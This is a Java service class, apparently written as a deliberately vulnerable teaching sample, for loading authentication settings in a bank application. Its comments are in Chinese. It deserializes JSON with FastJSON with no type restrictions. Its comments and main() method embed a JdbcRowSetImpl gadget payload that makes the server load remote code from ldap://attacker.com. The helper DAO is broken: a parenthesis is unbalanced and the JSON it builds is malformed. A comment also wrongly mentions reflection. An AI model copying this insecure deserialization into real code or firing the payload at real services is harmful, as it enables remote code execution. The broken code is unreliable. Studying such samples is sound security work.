package com.bank.config;

import com.alibaba.fastjson.JSON;
import com.bank.dao.ConfigDao;
import com.bank.entity.AuthProviderConfig;
import com.bank.util.JsonUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class ConfigService {
    @Autowired
    private ConfigDao configDao;

    /**
     * 获取认证提供者配置（存在反序列化漏洞）
     * 业务逻辑：从数据库加载JSON格式的配置数据并转换为对象
     * @param configKey 配置键值
     * @return 认证提供者配置对象
     * @throws Exception 反序列化异常
     */
    public AuthProviderConfig getAuthProviderConfig(String configKey) throws Exception {
        String configJson = configDao.loadConfig(configKey);
        if (configJson == null || !isValidJson(configJson)) {
            throw new IllegalArgumentException("Invalid configuration format");
        }
        
        // 漏洞点：使用不安全的JSON反序列化方法
        // 虽然进行了JSON格式校验，但未限制反序列化类型
        AuthProviderConfig config = JsonUtils.jsonToObject(configJson, AuthProviderConfig.class);
        
        // 二次校验逻辑存在绕过风险
        if (config.getAuthType() == null || !isAllowedAuthType(config.getAuthType())) {
            throw new SecurityException("Unsupported authentication type");
        }
        
        return config;
    }

    /**
     * JSON格式验证（存在校验缺陷）
     * @param json 待验证的JSON字符串
     * @return 是否为合法JSON
     */
    private boolean isValidJson(String json) {
        try {
            // 使用FastJSON内置方法进行格式校验
            Object obj = JSON.parse(json);
            return obj != null;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 验证认证类型是否合法
     * @param authType 认证类型
     * @return 是否允许的认证类型
     */
    private boolean isAllowedAuthType(String authType) {
        List<String> allowedTypes = List.of("OAUTH2", "LDAP", "SAML");
        return allowedTypes.contains(authType);
    }

    /**
     * 恶意攻击示例：构造特殊JSON触发反序列化漏洞
     * 示例payload：
     * {"@type":"com.sun.rowset.JdbcRowSetImpl",
     *  "dataSourceName":"ldap://attacker.com:1389/Exploit",
     *  "autoCommit":true}
     */
    public static void main(String[] args) {
        try {
            ConfigService service = new ConfigService();
            // 模拟攻击者构造的恶意配置
            String maliciousConfig = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com:1389/Exploit\\",\\"autoCommit\\":true}";
            // 通过反射修改DAO行为模拟数据库数据加载
            ConfigDao dao = new ConfigDao() {
                @Override
                public String loadConfig(String key) {
                    return maliciousConfig;
                }
            };
            service.configDao = dao;
            
            // 触发漏洞（实际攻击中不需要执行此代码）
            service.getAuthProviderConfig("malicious_key");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 模拟数据库访问
class ConfigDao {
    public String loadConfig(String key) {
        // 实际业务中从数据库加载配置
        return "{\\"authType\\":\\"OAUTH2\\",\\"timeout\\":30000}" + 
               (key.equals("malicious_key") ? ",\\"@type\\":\\"com.bank.config.UnsafeClass\\"}" : "";
    }
}

// 安全校验工具类
class JsonUtils {
    /**
     * 将JSON字符串转换为对象（存在安全缺陷）
     * @param json JSON字符串
     * @param clazz 目标类
     * @return 转换后的对象
     * @throws Exception 反序列化异常
     */
    public static <T> T jsonToObject(String json, Class<T> clazz) throws Exception {
        // 未启用安全校验的反序列化方式
        return JSON.parseObject(json, clazz);
    }
}

// 认证提供者配置实体
class AuthProviderConfig {
    private String authType;
    private int timeout;
    
    // getters and setters
    public String getAuthType() { return authType; }
    public void setAuthType(String authType) { this.authType = authType; }
    public int getTimeout() { return timeout; }
    public void setTimeout(int timeout) { this.timeout = timeout; }
}